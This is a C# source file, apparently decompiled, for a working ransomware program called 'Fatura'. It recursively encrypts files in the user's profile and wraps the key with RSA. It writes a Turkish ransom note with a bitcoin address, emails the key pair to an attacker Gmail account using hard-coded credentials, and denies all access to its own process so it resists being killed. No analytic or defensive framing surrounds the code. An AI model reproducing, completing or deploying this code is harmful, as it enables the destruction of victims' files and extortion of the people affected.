using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;
using System.Threading;
using Fatura.Properties;

namespace Fatura;

internal class Program
{
	[Flags]
	private enum ProcessAccessRights
	{
		PROCESS_CREATE_PROCESS = 0x80,
		PROCESS_CREATE_THREAD = 2,
		PROCESS_DUP_HANDLE = 0x40,
		PROCESS_QUERY_INFORMATION = 0x400,
		PROCESS_QUERY_LIMITED_INFORMATION = 0x1000,
		PROCESS_SET_INFORMATION = 0x200,
		PROCESS_SET_QUOTA = 0x100,
		PROCESS_SUSPEND_RESUME = 0x800,
		PROCESS_TERMINATE = 1,
		PROCESS_VM_OPERATION = 8,
		PROCESS_VM_READ = 0x10,
		PROCESS_VM_WRITE = 0x20,
		DELETE = 0x10000,
		READ_CONTROL = 0x20000,
		SYNCHRONIZE = 0x100000,
		WRITE_DAC = 0x40000,
		WRITE_OWNER = 0x80000,
		STANDARD_RIGHTS_REQUIRED = 0xF0000,
		PROCESS_ALL_ACCESS = 0x1F0FFF
	}

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr Handle, int securityInformation, [Out] byte[] pSecurityDescriptor, uint nLength, out uint lpnLengthNeeded);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr Handle, int securityInformation, [In] byte[] pSecurityDescriptor);

	[DllImport("kernel32.dll")]
	public static extern IntPtr GetCurrentProcess();

	private static void Main(string[] args)
	{
		if (FaturaIsNotRunning())
		{
			SetAclDenyAll();
			if (!File.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "temp.aes")))
			{
				RunInfector();
			}
		}
	}

	private static void RunInfector()
	{
		try
		{
			string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "temp.aes");
			string? environmentVariable = Environment.GetEnvironmentVariable("USERPROFILE");
			string path2 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "encKey.aes");
			string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "FaturaDecryptor.exe");
			string publicKey = string.Empty;
			string publicAndPrivateKey = string.Empty;
			List<string> files = GetFiles(environmentVariable, "*.*");
			FaturaClass faturaClass = new FaturaClass();
			foreach (string item in files)
			{
				FileInfo fileInfo = new FileInfo(item);
				if (!(fileInfo.Extension == ".txt") && !(fileInfo.Extension == ".md"))
				{
					try
					{
						faturaClass.EncryptFilePartially(fileInfo.FullName);
						File.Move(fileInfo.FullName, Path.Combine(fileInfo.DirectoryName, fileInfo.Name + ".partially.aes"));
					}
					catch (Exception)
					{
					}
				}
				else
				{
					try
					{
						faturaClass.EncryptFileFully(fileInfo.FullName);
						File.Move(fileInfo.FullName, Path.Combine(fileInfo.DirectoryName, fileInfo.Name + ".fully.aes"));
					}
					catch (Exception)
					{
					}
				}
			}
			faturaClass.GenerateKeys(1024, out publicKey, out publicAndPrivateKey);
			byte[] bytes = GetBytes(faturaClass.EncryptionKey);
			bytes = faturaClass.RsaEncryption(bytes, 1024, publicKey);
			File.WriteAllText(path2, Convert.ToBase64String(bytes));
			using (StreamWriter streamWriter = new StreamWriter(path, append: true))
			{
				streamWriter.WriteLine("Do not delete this file, else the decryption process will be broken");
			}
			string faturaMessage = Resources.FaturaMessage;
			faturaMessage = faturaMessage.Replace("[HWID goes here]", GetHwid());
			faturaMessage = faturaMessage.Replace("[bitcoin address]", "1yh3eJjuXwqqXgpu8stnojm148b8d6NFQ");
			File.WriteAllText(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "Kurtarma Bilgisi.txt"), faturaMessage, Encoding.Unicode);
			SendEmail(publicAndPrivateKey);
			if (!File.Exists(text))
			{
				File.WriteAllBytes(text, Resources.FaturaDecryptor);
			}
			Process.Start(text);
		}
		catch (Exception)
		{
		}
	}

	private static void SendEmail(string publicPrivateKey)
	{
		string body = Convert.ToBase64String(GetBytes(publicPrivateKey));
		MailMessage mailMessage = new MailMessage();
		mailMessage.From = new MailAddress("temp.malware@gmail.com");
		mailMessage.To.Add(new MailAddress("temp.malware@gmail.com"));
		mailMessage.Subject = GetHwid();
		mailMessage.Body = body;
		SmtpClient smtpClient = new SmtpClient();
		smtpClient.Host = "smtp.gmail.com";
		smtpClient.Port = 587;
		smtpClient.EnableSsl = true;
		smtpClient.UseDefaultCredentials = false;
		smtpClient.Credentials = new NetworkCredential("temp.malware@gmail.com", "User*1994");
		smtpClient.Send(mailMessage);
	}

	private static List<string> GetFiles(string path, string pattern)
	{
		List<string> list = new List<string>();
		try
		{
			list.AddRange(Directory.GetFiles(path, pattern, SearchOption.TopDirectoryOnly));
			string[] directories = Directory.GetDirectories(path);
			foreach (string path2 in directories)
			{
				list.AddRange(GetFiles(path2, pattern));
			}
			return list;
		}
		catch (Exception)
		{
			return list;
		}
	}

	private static void SetAclDenyAll()
	{
		IntPtr currentProcess = GetCurrentProcess();
		RawSecurityDescriptor processSecurityDescriptor = GetProcessSecurityDescriptor(currentProcess);
		processSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
		SetProcessSecurityDescriptor(currentProcess, processSecurityDescriptor);
	}

	private static RawSecurityDescriptor GetProcessSecurityDescriptor(IntPtr processHandle)
	{
		byte[] pSecurityDescriptor = new byte[0];
		GetKernelObjectSecurity(processHandle, 4, pSecurityDescriptor, 0u, out var lpnLengthNeeded);
		if (lpnLengthNeeded >= 0 && (long)lpnLengthNeeded <= 32767L)
		{
			if (!GetKernelObjectSecurity(processHandle, 4, pSecurityDescriptor = new byte[lpnLengthNeeded], lpnLengthNeeded, out lpnLengthNeeded))
			{
				throw new Win32Exception();
			}
			return new RawSecurityDescriptor(pSecurityDescriptor, 0);
		}
		throw new Win32Exception();
	}

	private static void SetProcessSecurityDescriptor(IntPtr processHandle, RawSecurityDescriptor dacl)
	{
		byte[] array = new byte[dacl.BinaryLength];
		dacl.GetBinaryForm(array, 0);
		if (!SetKernelObjectSecurity(processHandle, 4, array))
		{
			throw new Win32Exception();
		}
	}

	private static string GetHwid()
	{
		return new UHWIDEngine().SimpleUID;
	}

	private static bool FaturaIsNotRunning()
	{
		bool createdNew;
		Mutex obj = new Mutex(initiallyOwned: true, "FaturaWalker90912", out createdNew);
		if (!createdNew)
		{
			return false;
		}
		GC.KeepAlive(obj);
		return true;
	}

	private static byte[] GetBytes(string str)
	{
		byte[] array = new byte[str.Length * 2];
		Buffer.BlockCopy(str.ToCharArray(), 0, array, 0, array.Length);
		return array;
	}
}
